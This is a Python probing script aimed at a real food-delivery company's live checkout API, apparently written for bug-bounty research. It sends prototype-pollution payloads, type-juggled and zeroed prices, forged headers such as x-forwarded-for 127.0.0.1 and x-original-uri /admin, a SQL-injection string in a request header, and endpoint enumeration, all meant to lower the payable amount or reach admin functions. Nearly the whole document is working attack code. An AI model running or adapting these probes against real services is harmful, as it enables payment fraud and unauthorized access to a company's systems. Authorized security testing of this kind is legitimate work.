"""Last creative probes: feature flags, pollution, type confusion."""
import requests, json

H = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'X-HackerOne-Research': 'pccp',
    'Origin': 'https://wolt.com',
}
VENUE_ID = '60ebeb71c6904c2caf035f71'
FAKE_ITEM_ID = '670fa3e9ead6e49d65cc3614'

def make_body(**overrides):
    item = {'id': FAKE_ITEM_ID, 'name': 'Test', 'count': 1,
            'price': 100, 'base_price': 100, 'end_amount': 100,
            'options': [], 'restrictions': [], 'category_id': '',
            'exclude_from_discounts': False}
    body = {
        'items': [item], 'base_price': 100, 'end_amount': 100,
        'supplier_id': VENUE_ID, 'selected_delivery_method': 'homedelivery',
        'delivery_location': {'lat': 60.168142, 'lon': 24.939986},
        'currency': 'EUR', 'vendor': 'wolt', 'discount': 0, 'surcharges': [],
        'basket_id': 'creative-test', 'pickup': False, 'scheduled_time': None,
        'shipping_method': 'homedelivery', 'discount_code': None,
        'purchase_plan': {
            'venue': {'id': VENUE_ID, 'country': 'FIN', 'currency': 'EUR'},
            'delivery_method': 'homedelivery',
            'menu_items': [dict(item)]
        }
    }
    body.update(overrides)
    return body

CK = 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout'

print("=== 1. PROTOTYPE POLLUTION ===\n")
for key in ['__proto__', 'constructor', '__defineGetter__']:
    body = make_body()
    body[key] = {'isAdmin': True}
    r = requests.post(CK, headers={**H, 'Content-Type': 'application/json'}, json=body, timeout=15)
    if r.status_code == 200:
        d = r.json()
        print(f"  {key:30s} -> 200 | payable={d.get('payable_amount')} | keys={list(d.keys())[:5]}")
    else:
        print(f"  {key:30s} -> {r.status_code} | {r.text[:150]}")

# Nested pollution
body2 = make_body()
body2['items'][0]['__proto__'] = {'price': 0}
r = requests.post(CK, headers={**H, 'Content-Type': 'application/json'}, json=body2, timeout=15)
print(f"  items[0].__proto__=price:0      -> {r.status_code} | {r.json().get('payable_amount','?') if r.status_code==200 else r.text[:100]}")

print("\n=== 2. CONTENT-TYPE ABUSE ===\n")
for ct, data_func in [
    ('application/xml', lambda: '<checkout><price>0</price></checkout>'),
    ('application/x-www-form-urlencoded', lambda: 'price=0&supplier_id=test'),
    ('text/plain', lambda: json.dumps(make_body(base_price=0, end_amount=0))),
]:
    r = requests.post(CK, headers={**H, 'Content-Type': ct}, data=data_func(), timeout=15)
    pa = r.json().get('payable_amount', '?') if r.status_code == 200 else r.text[:100]
    print(f"  {ct:45s} -> {r.status_code} | {pa}")

print("\n=== 3. TYPE JUGGLING ===\n")
type_tests = [
    ('price=str"0"', {'items': [{'price': '0', 'base_price': '0', 'end_amount': '0'}],
     'base_price': '0', 'end_amount': '0'}),
    ('price=float0.5', {'items': [{'price': 0.5, 'base_price': 0.5, 'end_amount': 0.5}],
     'base_price': 0.5, 'end_amount': 0.5}),
    ('price=boolTrue', {'items': [{'price': True, 'base_price': True, 'end_amount': True}],
     'base_price': True, 'end_amount': True}),
    ('price=null', {'items': [{'price': None, 'base_price': None, 'end_amount': None}],
     'base_price': None, 'end_amount': None}),
    ('items=str', {'items': 'not_an_array'}),
    ('items=[str]', {'items': ['not_an_object']}),
]
for label, overrides in type_tests:
    body = make_body()
    body.update(overrides)
    r = requests.post(CK, headers={**H, 'Content-Type': 'application/json'}, json=body, timeout=15)
    if r.status_code == 200:
        d = r.json()
        print(f"  {label:25s} -> 200 | payable={d.get('payable_amount')}")
    else:
        print(f"  {label:25s} -> {r.status_code} | {r.text[:150]}")

print("\n=== 4. FEATURE FLAG HEADERS ===\n")
ff_tests = [
    {'x-wolt-experiment-ids': 'admin_panel_enabled'},
    {'x-wolt-treatment-flags': '{"is_admin":true}'},
    {'x-wolt-request-id': "1' OR '1'='1"},
    {'x-forwarded-for': '127.0.0.1'},
    {'x-real-ip': '127.0.0.1'},
    {'x-original-uri': '/admin'},
    {'x-rewrite-url': '/admin'},
]
for hdrs in ff_tests:
    r = requests.post(CK, headers={**H, 'Content-Type': 'application/json', **hdrs},
                      json=make_body(), timeout=15)
    pa = r.json().get('payable_amount', '?') if r.status_code == 200 else r.text[:80]
    print(f"  {list(hdrs.keys())[0]:30s} -> {r.status_code} | payable={pa}")

print("\n=== 5. ALTERNATIVE CHECKOUT ENDPOINTS ===\n")
alt_endpoints = [
    'https://consumer-api.wolt.com/v1/pages/checkout',
    'https://consumer-api.wolt.com/v2/pages/checkout',
    'https://consumer-api.wolt.com/order-xp/web/v1/pages/checkout',
    'https://consumer-api.wolt.com/order-xp/web/v3/pages/checkout',
    'https://consumer-api.wolt.com/api/v1/checkout',
    'https://consumer-api.wolt.com/api/v2/checkout',
    'https://restaurant-api.wolt.com/v1/checkout',
    'https://restaurant-api.wolt.com/v2/checkout',
]
for url in alt_endpoints:
    r = requests.post(url, headers={**H, 'Content-Type': 'application/json'}, json=make_body(), timeout=15)
    if r.status_code != 404:
        pa = r.json().get('payable_amount', '?') if r.status_code == 200 else r.text[:80]
        print(f"  POST {url.split('.com')[-1]:45s} -> {r.status_code} | {pa}")

print("\n=== DONE ===")
